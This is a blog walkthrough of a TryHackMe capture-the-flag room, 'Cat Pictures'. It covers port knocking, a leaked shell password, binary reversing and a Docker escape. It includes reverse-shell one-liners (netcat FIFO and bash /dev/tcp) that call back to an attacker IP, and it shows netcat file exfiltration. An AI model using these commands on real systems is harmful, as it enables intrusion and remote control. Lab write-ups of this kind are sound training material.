---
title: Walkthrough - Cat Pictures
published: true
---

Security, PHPbb, Forum, Docker, Port Knocking. A forum where you can post cute cat pictures!

[https://tryhackme.com/room/yearoftherabbit](https://tryhackme.com/room/yearoftherabbit)

* * *

## Notes

```
PORT     STATE    SERVICE     REASON
21/tcp   filtered ftp         port-unreach ttl 61
22/tcp   open     ssh         syn-ack ttl 61
2375/tcp filtered docker      port-unreach ttl 61
4420/tcp open     nvm-express syn-ack ttl 61
8080/tcp open     http-proxy  syn-ack ttl 60   
```

```
PORT     STATE  SERVICE      VERSION
21/tcp   closed ftp
22/tcp   open   ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:43:64:80:d3:5a:74:62:81:b7:80:6b:1a:23:d8:4a (RSA)
|   256 53:c6:82:ef:d2:77:33:ef:c1:3d:9c:15:13:54:0e:b2 (ECDSA)
|_  256 ba:97:c3:23:d4:f2:cc:08:2c:e1:2b:30:06:18:95:41 (ED25519)
2375/tcp closed docker
4420/tcp open   nvm-express?
| fingerprint-strings: 
|   DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     INTERNAL SHELL SERVICE
|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
|     ctrl-c
|     Please enter password:
|     Invalid password...
|     Connection Closed
|   NULL, RPCCheck: 
|     INTERNAL SHELL SERVICE
|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
|     ctrl-c
|_    Please enter password:
8080/tcp open   http         Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
|_http-title: Cat Pictures - Index page
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27
```

Visiting the phpbb on port 8080 and checking the version `/styles/prosilver/style.cfg` we can see version 3.3.3 which has no known exploits

- we can find a user `user` and a possible hint on their post

![0xskar](/assets/cat-pictures01.png)

```
POST ALL YOUR CAT PICTURES HERE :)
Knock knock! Magic numbers: 1111, 2222, 3333, 4444
```

- port knocking - let them know we want in `sudo knock '10.10.120.58' 1111 2222 3333 4444`
- and portscan again with nmap to see if they let us in `sudo nmap -sV -sT -sC -O -p21,22,2375,4420,8080 10.10.120.58` and we have open port ftp 21. login and get the note.

```
In case I forget my password, I'm leaving a pointer to the internal shell service on the server.

Connect to port 4420, the password is sardinethecat.
- catlover
```

We can `nc -nv` into the port 4420 and enter the password. maybe possibly get a better shell. `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.2.127.225 6666 >/tmp/f` and we are there. Still super limited to what we can do here, and after looking around a bit nowhere to go other than the runme file. 

We only have limited options and in order to check out the runme file we have to get it over to our machine. We can do this with netcat. `nc -l -p 1234 > runme` on attacker machine and `nc -w 3 'ip' 1234 < runme` on the target inside the home directory.

- `r2 runme` to open runme in radarem, `aaa` to analaze, `s main` to select the main function, and finally `pdf` to display.

Looking at the file it looks like it needs a password and upon success it will send back a SSH key. Going to open in `ghidra` as well to get another look.

![0xskar](/assets/cat-pictures02.png)

Our password for runme is `rebecca` when we enter this the function it creates an ssh key in the user dir.

Using this key we can ssh in as catlover and it turns out to be root!

* * * 

## What is the flag 1?

![0xskar](/assets/cat-pictures03.png)

Turns out this is only root for flag 1. We are stuck in a docker container and must get out for the real root flag.

Inside of the `/opt/clean` directory there is a script that cleans the /tmp/ dir. We can edit this file and add a bash reverse shell at the end of it and setup a listener to get another root shell. `bash -i >& /dev/tcp/'10.2.127.225'/6969 0>&1`

* * * 

## What is the root flag?

![0xskar](/assets/cat-pictures04.png)

* * * 

